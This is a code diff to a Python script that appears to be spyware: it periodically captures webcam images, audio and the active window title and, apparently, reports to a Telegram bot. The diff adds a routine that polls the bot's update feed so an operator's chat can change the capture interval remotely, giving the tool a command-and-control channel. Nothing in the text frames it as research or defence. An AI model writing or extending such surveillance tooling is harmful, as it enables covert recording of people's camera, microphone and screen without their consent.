@@ -25,9 +25,10 @@ TOPIC_SCREENSHOT = os.getenv("TOPIC_SCREENSHOT")
 TOPIC_AUDIO = os.getenv("TOPIC_AUDIO")
 TOPIC_GENERAL = os.getenv("TOPIC_GENERAL")
 
-INTERVAL = 60  # seconds between captures
-AUDIO_DURATION = 5  # seconds
+INTERVAL = 60  # Default 60 seconds
+AUDIO_DURATION = 5  
 SAMPLE_RATE = 44100
+LAST_UPDATE_ID = 0
 
 def get_temp_path(filename):
     return os.path.join(tempfile.gettempdir(), filename)
@@ -40,6 +41,29 @@ def get_active_window():
         except Exception:
             return "Error retrieving window"
     return "Non-Windows Environment"
+
+def update_remote_config():
+    global INTERVAL, LAST_UPDATE_ID
+    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
+    try:
+        # Check for new commands from the authorized chat
+        params = {"offset": LAST_UPDATE_ID + 1, "timeout": 0}
+        resp = requests.get(url, params=params, timeout=5).json()
+        if resp.get("ok"):
+            for update in resp.get("result", []):
+                LAST_UPDATE_ID = update["update_id"]
+                msg = update.get("message", {})
+                text = msg.get("text", "").strip()
+                
+                # Check if message is from the authorized group/chat
+                if str(msg.get("chat", {}).get("id")) == str(CHAT_ID):
+                    if text.isdigit():
+                        new_val = int(text)
+                        # Limit interval between 10 seconds and 1 hour
+                        if 10 <= new_val <= 3600:
+                            INTERVAL = new_val
+    except Exception:
+        pass
 
 def capture_webcam(filename):
     cam = cv2.VideoCapture(0)
@@ -126,6 +150,9 @@ def main():
 
     try:
         while True:
+            # Check for remote interval updates
+            update_remote_config()
+
             window_title = get_active_window()
             
             # Capture all data points
